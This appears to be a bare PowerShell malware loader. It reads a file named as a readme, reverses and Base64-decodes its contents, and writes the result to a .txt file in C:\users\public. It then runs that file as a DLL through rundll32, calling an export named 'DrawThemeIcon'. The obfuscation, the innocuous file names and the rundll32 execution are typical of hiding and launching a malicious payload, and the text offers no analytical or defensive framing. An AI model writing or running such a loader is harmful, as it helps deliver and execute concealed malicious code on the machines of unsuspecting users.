$b64 = Get-Content -Path 'teased\readme.txt';
$b64[-1..-($b64.Length)] -join '';
$r = $b64.ToCharArray();
[array]::Reverse($r);
-join($r);

$filename = 'C:\users\public\marqueesInvariance.txt';
$bytes = [Convert]::FromBase64String($r);
[IO.File]::WriteAllBytes($filename, $bytes);

$meth = 'DrawThemeIcon';

start-process rundll32 $filename,$meth;

